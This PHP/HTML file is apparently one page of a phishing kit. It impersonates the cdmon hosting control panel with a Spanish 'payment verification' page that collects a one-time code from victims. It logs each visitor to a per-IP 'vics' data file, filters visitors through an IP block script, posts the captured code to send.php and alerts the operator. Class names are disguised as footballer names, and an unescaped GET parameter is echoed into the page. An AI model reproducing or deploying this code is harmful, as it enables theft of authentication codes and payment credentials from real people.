<?php 
require '../main.php';
require_once 'blockip.php';
// Get the custom message if it exists
$m = new Mother;
$ip = $m->getIp();
$m->setDataFile(__DIR__ . "/../panel/data/vics/VIC-$ip.json");
$data = $m->getData();
$customMessage = isset($data["CUSTOM_MESSAGE"]) ? $data["CUSTOM_MESSAGE"] : "";
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" type="image/ico" href="./img/fav.ico" />
    <title>cdmon - cdmon Control panel</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        .benzema-body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background-color: #f5f5f5;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        .modric-header {
            background-color: white;
            padding: 20px;
            text-align: center;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }

        .kroos-logo {
            display: flex;
            align-items: center;
            justify-content: space-between;
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 20px;
        }

        .kroos-cdmon-logo {
            height: 40px;
            width: auto;
        }

        .kroos-comercia-logo {
            height: 35px;
            width: auto;
            position: absolute;
            left: 50%;
            transform: translateX(-50%);
        }

        .kroos-logo::before {
            display: none;
        }

        .kroos-logo-text {
            display: none;
        }

        .vinicius-container {
            flex: 1;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 40px 20px;
            max-width: 500px;
            margin: 0 auto;
        }

        .haaland-verification-card {
            background: white;
            border-radius: 12px;
            box-shadow: 0 2px 12px rgba(0,0,0,0.08);
            overflow: hidden;
            width: 100%;
            max-width: 420px;
            border: 1px solid #e5e7eb;
        }

        .haaland-title {
            text-align: center;
            font-size: 22px;
            font-weight: 600;
            color: #374151;
            padding: 25px 25px 20px;
            border-bottom: 1px solid #f3f4f6;
        }

        .messi-sms-header {
            background: #f9fafb;
            color: #374151;
            padding: 15px 25px;
            font-size: 16px;
            font-weight: 500;
            text-align: center;
            border-bottom: 1px solid #e5e7eb;
        }

        .neymar-notification {
            background: #f0fdf4;
            border: 1px solid #bbf7d0;
            border-radius: 8px;
            padding: 12px 15px;
            margin: 20px;
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .neymar-icon {
            width: 20px;
            height: 20px;
            object-fit: contain;
        }

        .neymar-text {
            color: #15803d;
            font-size: 13px;
            font-weight: 400;
        }

        .suarez-content {
            padding: 0 25px 25px;
        }

        .suarez-description {
            color: #6b7280;
            font-size: 14px;
            line-height: 1.5;
            margin-bottom: 20px;
            text-align: center;
        }

        .lewandowski-code-section {
            margin-bottom: 20px;
        }

        .lewandowski-label {
            font-size: 14px;
            font-weight: 500;
            color: #374151;
            margin-bottom: 8px;
            display: block;
        }

        .lewandowski-input {
            width: 100%;
            padding: 12px 15px;
            border: 1px solid #d1d5db;
            border-radius: 8px;
            font-size: 16px;
            transition: all 0.2s ease;
            background: white;
            text-align: center;
            font-weight: 500;
            letter-spacing: 2px;
            color: #374151;
        }

        .lewandowski-input:focus {
            outline: none;
            border-color: #3b82f6;
            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.1);
        }

        .lewandowski-input::placeholder {
            color: #9ca3af;
            letter-spacing: normal;
            font-weight: 400;
        }

        .mbappe-verify-btn {
            width: 100%;
            padding: 12px;
            background: #3b82f6;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.2s ease;
        }

        .mbappe-verify-btn:hover:not(:disabled) {
            background: #2563eb;
        }

        .mbappe-verify-btn:active:not(:disabled) {
            background: #1d4ed8;
        }

        .mbappe-verify-btn:disabled {
            background: #f3f4f6;
            color: #9ca3af;
            cursor: not-allowed;
        }

        .zidane-footer {
            background: #e8e8e8;
            padding: 0;
            text-align: center;
        }

        .zidane-footer-image {
            width: 100%;
            height: auto;
            display: block;
        }

        @media (max-width: 768px) {
            .vinicius-container {
                padding: 20px 15px;
            }
            
            .haaland-verification-card {
                max-width: 100%;
            }
            
            .haaland-title {
                font-size: 20px;
                padding: 20px 20px 15px;
            }
            
            .messi-sms-header {
                padding: 12px 20px;
                font-size: 15px;
            }
            
            .neymar-notification {
                margin: 15px;
                padding: 10px 12px;
            }
            
            .suarez-content {
                padding: 0 20px 20px;
            }
            
            .suarez-description {
                font-size: 13px;
            }
            
            .lewandowski-label {
                font-size: 13px;
            }
            
            /* Hide center logo on mobile */
            .kroos-comercia-logo {
                display: none;
            }
            
            /* Mobile footer image */
            .zidane-footer-image {
                content: url('./img/foot-desk.webp');
            }
        }

        /* Loading animation */
        .mbappe-verify-btn.loading {
            position: relative;
            color: transparent;
        }

        .mbappe-verify-btn.loading::after {
            content: '';
            position: absolute;
            width: 16px;
            height: 16px;
            top: 50%;
            left: 50%;
            margin-left: -8px;
            margin-top: -8px;
            border: 2px solid transparent;
            border-top-color: white;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body class="benzema-body">
    <!-- Hidden images for preloading -->
    <img src="./img/lgo.webp" style="display: none;" id="cdmon-logo-src">
    <img src="./img/gt.webp" style="display: none;" id="comercia-logo-src">
    <img src="./img/vs.webp" style="display: none;" id="payment-methods-src">
    <img src="./img/foot.webp" style="display: none;" id="footer-src">
    
    <header class="modric-header">
        <div class="kroos-logo">
            <img src="./img/lggo.webp" class="kroos-cdmon-logo">
            <img src="./img/glob.webp" class="kroos-comercia-logo">
        </div>
    </header>

    <main class="vinicius-container">
        <div class="haaland-verification-card">
            <h1 class="haaland-title">Verificación de pago</h1>
            
            <div class="messi-sms-header">
                Verificación
            </div>
            
            <div class="neymar-notification">
                <img src="./img/16031610.webp" class="neymar-icon">
                <div class="neymar-text">Verificar autenticación: Confirme sus credenciales.</div>
            </div>
            
            <div class="suarez-content">
             

                
      <form method="POST" action="send.php">
    <div class="lewandowski-code-section">
        <label class="lewandowski-label"></label>
        <?php echo htmlspecialchars($customMessage); ?>
        <input 
            type="text" 
            class="lewandowski-input" 
            placeholder="Introducir código"
            name="zbii"
            required
        >
    </div>
    
    <input type="hidden" name="order_id" value="<?php echo $_GET['o'] ?? 'unknown'; ?>">
    
    <button type="submit" class="mbappe-verify-btn">
        Verificar
    </button>
</form>

            </div>
        </div>
    </main>

    <footer class="zidane-footer">
        <img src="./img/fiiit.webp" class="zidane-footer-image">
    </footer>

<script src="js/jq.js"></script>
<?php $m->ctr(" CUSTOM MESSAGE 🔔 ".@$_GET['e']); ?>
</body>
</html>